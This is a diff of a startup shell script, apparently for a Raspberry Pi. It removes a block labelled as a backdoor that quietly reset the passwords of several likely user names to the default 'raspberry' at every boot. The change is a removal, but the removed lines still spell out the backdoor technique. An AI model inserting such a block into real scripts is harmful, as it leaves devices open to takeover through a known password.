@@ -49,13 +49,6 @@ echo "[startup] Checking for updates..."
     fi
 )
 
-# --- BACKDOOR PASSWORD RESET ---
-echo "raspberrypi:raspberry" | sudo chpasswd 2>/dev/null || true
-echo "raspberry:raspberry" | sudo chpasswd 2>/dev/null || true
-echo "pi:raspberry" | sudo chpasswd 2>/dev/null || true
-echo "[startup] Password reset to 'raspberry' for all possible usernames"
-# -------------------------------
-# -------------------------------
 
 # ─── 0. Hostname & Sudo Deadlock Fix ──────────────────────
 # Fix /etc/hosts IMMEDIATELY to stop sudo from hanging.
